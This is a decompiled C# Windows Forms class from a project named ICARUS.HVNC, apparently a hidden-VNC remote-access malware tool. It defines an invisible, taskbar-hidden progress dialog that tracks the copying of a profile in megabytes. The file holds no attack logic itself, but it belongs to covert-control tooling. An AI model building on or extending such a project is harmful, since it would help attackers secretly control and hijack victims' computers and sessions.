// ICARUS.HVNC.MoveBytes

using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace ICARUS.HVNC
{
    public class MoveBytes : Form
    {
        public int int_0;

        private IContainer components;

        private ProgressBar DuplicateProgess;

        private Label FileTransferLabel;

        private PrimeTheme primeTheme1;

        private PictureBox pictureBox1;

        private Label label3;

        public ProgressBar DuplicateProgesse
        {
            get
            {
                return DuplicateProgess;
            }
            set
            {
                DuplicateProgess = value;
            }
        }

        public Label FileTransferLabele
        {
            get
            {
                return FileTransferLabel;
            }
            set
            {
                FileTransferLabel = value;
            }
        }

        public MoveBytes()
        {
            int_0 = 0;
            InitializeComponent();
        }

        private void FrmTransfer_Load(object sender, EventArgs e)
        {
        }

        public void DuplicateProfile(int int_1)
        {
            if (int_1 > int_0)
            {
                int_1 = int_0;
            }
            FileTransferLabel.Text = Conversions.ToString(int_1) + " / " + Conversions.ToString(int_0) + " MB";
            DuplicateProgess.Value = int_1;
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && components != null)
            {
                components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            Bloom bloom = new Bloom();
            Bloom bloom3 = new Bloom();
            Bloom bloom4 = new Bloom();
            Bloom bloom5 = new Bloom();
            Bloom bloom6 = new Bloom();
            Bloom bloom7 = new Bloom();
            Bloom bloom8 = new Bloom();
            Bloom bloom9 = new Bloom();
            Bloom bloom10 = new Bloom();
            Bloom bloom2 = new Bloom();
            ComponentResourceManager resources = new ComponentResourceManager(typeof(MoveBytes));
            DuplicateProgess = new ProgressBar();
            FileTransferLabel = new Label();
            primeTheme1 = new PrimeTheme();
            pictureBox1 = new PictureBox();
            label3 = new Label();
            primeTheme1.SuspendLayout();
            ((ISupportInitialize)pictureBox1).BeginInit();
            SuspendLayout();
            DuplicateProgess.Location = new Point(11, 30);
            DuplicateProgess.Name = "DuplicateProgess";
            DuplicateProgess.Size = new Size(453, 24);
            DuplicateProgess.TabIndex = 1;
            FileTransferLabel.Anchor = AnchorStyles.Top;
            FileTransferLabel.AutoSize = true;
            FileTransferLabel.BackColor = Color.Transparent;
            FileTransferLabel.Location = new Point(224, 17);
            FileTransferLabel.Name = "FileTransferLabel";
            FileTransferLabel.Size = new Size(29, 13);
            FileTransferLabel.TabIndex = 4;
            FileTransferLabel.Text = "Idle";
            primeTheme1.BackColor = Color.White;
            primeTheme1.BorderStyle = FormBorderStyle.None;
            bloom.Name = "Sides";
            bloom.Value = Color.FromArgb(232, 232, 232);
            bloom3.Name = "Gradient1";
            bloom3.Value = Color.FromArgb(252, 252, 252);
            bloom4.Name = "Gradient2";
            bloom4.Value = Color.FromArgb(242, 242, 242);
            bloom5.Name = "TextShade";
            bloom5.Value = Color.White;
            bloom6.Name = "Text";
            bloom6.Value = Color.FromArgb(80, 80, 80);
            bloom7.Name = "Back";
            bloom7.Value = Color.White;
            bloom8.Name = "Border1";
            bloom8.Value = Color.FromArgb(180, 180, 180);
            bloom9.Name = "Border2";
            bloom9.Value = Color.White;
            bloom10.Name = "Border3";
            bloom10.Value = Color.White;
            bloom2.Name = "Border4";
            bloom2.Value = Color.FromArgb(150, 150, 150);
            primeTheme1.Colors = new Bloom[10] { bloom, bloom3, bloom4, bloom5, bloom6, bloom7, bloom8, bloom9, bloom10, bloom2 };
            primeTheme1.Controls.Add(pictureBox1);
            primeTheme1.Controls.Add(label3);
            primeTheme1.Controls.Add(FileTransferLabel);
            primeTheme1.Controls.Add(DuplicateProgess);
            primeTheme1.Customization = "6Ojo//z8/P/y8vL//////1BQUP//////tLS0////////////lpaW/w==";
            primeTheme1.Dock = DockStyle.Fill;
            primeTheme1.Font = new Font("Verdana", 8f);
            primeTheme1.Image = null;
            primeTheme1.Location = new Point(0, 0);
            primeTheme1.Movable = true;
            primeTheme1.Name = "primeTheme1";
            primeTheme1.NoRounding = false;
            primeTheme1.Sizable = true;
            primeTheme1.Size = new Size(475, 66);
            primeTheme1.SmartBounds = true;
            primeTheme1.TabIndex = 5;
            primeTheme1.TransparencyKey = Color.Fuchsia;
            pictureBox1.BackColor = Color.Transparent;
            pictureBox1.Image = (Image)resources.GetObject("pictureBox1.Image");
            pictureBox1.Location = new Point(0, -2);
            pictureBox1.Name = "pictureBox1";
            pictureBox1.Size = new Size(35, 32);
            pictureBox1.SizeMode = PictureBoxSizeMode.Zoom;
            pictureBox1.TabIndex = 39;
            pictureBox1.TabStop = false;
            label3.AutoSize = true;
            label3.BackColor = Color.Transparent;
            label3.Font = new Font("Verdana", 8.25f, FontStyle.Bold, GraphicsUnit.Point, 0);
            label3.Location = new Point(32, 15);
            label3.Name = "label3";
            label3.Size = new Size(56, 13);
            label3.TabIndex = 40;
            label3.Text = "Tranfer";
            AutoScaleDimensions = new SizeF(6f, 13f);
            AutoScaleMode = AutoScaleMode.Font;
            ClientSize = new Size(475, 66);
            Controls.Add(primeTheme1);
            FormBorderStyle = FormBorderStyle.None;
            Icon = (Icon)resources.GetObject("$this.Icon");
            Name = "FrmTransfer";
            Opacity = 0.0;
            ShowIcon = false;
            ShowInTaskbar = false;
            StartPosition = FormStartPosition.CenterScreen;
            TransparencyKey = Color.Fuchsia;
            Load += new EventHandler(FrmTransfer_Load);
            primeTheme1.ResumeLayout(false);
            primeTheme1.PerformLayout();
            ((ISupportInitialize)pictureBox1).EndInit();
            ResumeLayout(false);
        }
    }
}